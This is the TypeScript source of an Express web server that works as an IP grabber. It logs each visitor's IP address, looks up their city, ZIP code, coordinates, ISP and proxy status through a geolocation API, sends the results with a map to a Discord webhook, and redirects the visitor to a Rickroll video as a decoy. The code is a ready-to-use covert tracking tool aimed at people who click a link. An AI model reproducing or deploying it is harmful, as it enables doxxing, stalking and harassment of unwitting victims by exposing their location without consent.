// External imports
import axios from "axios";
import morgan from "morgan";
import express from "express";
import { createServer } from "http";
import "dotenv/config";

// External typings imports
import type { Request, Response } from "express";

// App
const app = express();
const server = createServer(app);

// App settings
app.set("port", process.env.PORT || 5000);
app.set("json spaces", 2);
app.set("trust proxy", true);

// Middlewares
app.use(morgan("dev"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Colors
var colors = require("colors/safe");

// Discord
import Discord from "discord.js";

// Routes
app.get("*", async (req: Request, res: Response): Promise<void> => {
  const ipHeaders =
    req.headers["x-forwarded-for"] ?? req.connection.remoteAddress ?? "";
  const ipv4 = ipHeaders.toString().replace("::ffff:", "");

  if (ipv4) {
    const url = "https://ipapi.lauty.dev/" + ipv4 + "?fields=66846719";

    const info = await axios.get(url);
    const data = info.data;

    res.redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ");

    // Discord
    const webhookClient = new Discord.WebhookClient({
      url: `${process.env.WH_URL}`,
    });

    const embed = new Discord.EmbedBuilder()
      .setTitle("New entry")
      .addFields(
        { name: "IP", value: data.query || "No data", inline: true },
        { name: "Continent", value: data.continent || "No data", inline: true },
        {
          name: "Continent code",
          value: data.continentCode || "No data",
          inline: true,
        },
        { name: "Country", value: data.country || "No data", inline: true },
        {
          name: "Country code",
          value: data.countryCode || "No data",
          inline: true,
        },
        {
          name: "State/Province",
          value: data.regionName || "No data",
          inline: true,
        },
        {
          name: "State/Province code",
          value: data.region || "No data",
          inline: true,
        },
        { name: "City", value: data.city || "No data", inline: true },
        { name: "ZIP", value: data.zip || "No data", inline: true },
        { name: "Latitude", value: `${data.lat || "No data"}`, inline: true },
        { name: "Longitude", value: `${data.lon || "No data"}`, inline: true },
        { name: "Time zone", value: data.timezone || "No data", inline: true },
        { name: "Currency", value: data.currency || "No data", inline: true },
        { name: "ISP", value: data.isp || "No data", inline: true },
        { name: "Organization", value: data.org || "No data", inline: true },
        { name: "AS", value: data.as || "No data", inline: true },
        { name: "AS name", value: data.reverse || "No data", inline: true },
        { name: "Mobile?", value: `${data.mobile || "No data"}`, inline: true },
        { name: "Proxy?", value: `${data.mobile || "No data"}`, inline: true },
        {
          name: "Hosting?",
          value: `${data.hosting || "No data"}`,
          inline: true,
        }
      )
      .setColor("#4791d8");

    if (!data.lat || !data.lon) {
      embed.setImage(
        "https://cdn.dribbble.com/users/1449854/screenshots/4136663/media/381780b56b2f28faa745c43b7ff88086.png"
      );
    } else {
      embed.setImage(
        `https://api.mapbox.com/styles/v1/mapbox/streets-v11/static/geojson(%7B%22type%22%3A%22Point%22%2C%22coordinates%22%3A%5B${
          data.lon || 0
        }%2C${data.lat || 0}%5D%7D)/${data.lon || 0},${
          data.lat || 0
        },3/500x300?access_token=${process.env.MAPBOX_TOKEN}`
      );
    }

    webhookClient.send({ embeds: [embed] });
  }
});

// Start server
server.listen(app.get("port"), (): void => {
  console.log(
    colors.red("[SERVER]") +
      " Server listening on port " +
      colors.green(app.get("port"))
  );
});

process.on("unhandledRejection", (error) => {
  console.error(error);
});
